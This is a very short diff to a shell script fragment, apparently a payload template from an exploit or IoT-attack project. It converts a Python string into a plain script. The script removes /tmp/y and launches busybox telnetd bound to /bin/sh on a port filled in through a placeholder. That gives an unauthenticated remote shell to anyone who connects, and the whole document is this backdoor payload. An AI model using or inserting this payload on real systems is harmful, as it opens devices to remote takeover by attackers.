@@ -1,4 +1,4 @@
-'''#!/bin/sh
+#!/bin/sh
 rm -f /tmp/y
 /bin/busybox telnetd -F -l /bin/sh -p %d &
-'''
+
